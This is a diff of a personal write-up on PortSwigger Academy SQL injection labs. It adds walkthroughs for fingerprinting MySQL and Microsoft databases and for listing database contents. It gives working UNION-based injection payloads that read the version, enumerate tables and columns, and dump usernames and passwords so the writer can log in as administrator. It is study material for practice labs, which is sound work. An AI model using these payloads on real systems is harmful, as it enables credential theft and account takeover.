@@ -13,7 +13,7 @@ image:
 
 This is my write-up for the *SQL Injection* learning path at the Portswigger Academy.\
 The reason for this write-up is to have a cheat-sheet or some go-to notes for myself.\
-Probably I've found flags in a different way than intended (with or without the use of BurpSuite), and not always in the order of the hints.
+Probably I've found flags in a different way than intended (with or without the use of BurpSuite), and not always in the order of learning path.
 
 [Portswigger Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)
 
@@ -64,6 +64,38 @@ For Oracle DB's we have to do the following:\
 
 Now that this doens't return an error, we can actually check which database type we are dealing with:\
 `https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,banner FROM v$version--`
+
+
+## LAB : SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+Going back to the basics, on trying to figure out how many columns need to be returned by the injection, all attempts failed.\
+Both the normal `UNION SELECT NULL,NULL,NULL--` as well as the previous `UNION SELECT NULL,NULL,NULL FROM dual--`.\
+Looking at the SQL Injection cheat sheet, referred to in the lab, it shows that for MySQL you need to use the *#* to force exit a query statement.\
+However, trying this directly in the browser didn't work either... So... Welcome BurpSuite.
+
+Intercept the request to show the items in a certain category. And modify the GET call:\
+`GET /filter?category=Pets'+UNION+SELECT+NULL,NULL#`\
+`GET /filter?category=Pets'+UNION+SELECT+'abc','xzy'#`\
+`GET /filter?category=Pets'+UNION+SELECT+'abc',@@version#`
+
+
+## LAB : SQL injection attack, listing the database contents on non-Oracle databases.
+
+The lab tells us that it's not an Oracle database, so first things first, let's try to find the number of columns we need to return; and which can contain strings:\
+`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL--`\
+`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT 'abc','xyz'--`
+
+We now know that we have two string columns, one for the title, one for the body. Let's see which tables exist in the database:\
+`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT 'existing tables',Table_Name FROM information_schema.tables--`
+
+In here, we see an interesting table `users_whjefl` (your's might be a different random string). Next up, see which colums exist in this table:\
+`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT 'existing columns',Column_Name FROM information_schema.columns WHERE Table_Name='users_whjefl'--`
+
+And also here, we find 2 interesting column names. One for the usernames, one for the passwords. Now we can extract all the user info:\
+`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT username_jdlmjy,password_pdopfu FROM users_whjefl--`
+
+With the usernames and passwords returned, we can login as the administrator on this website. 
+
 
 
 
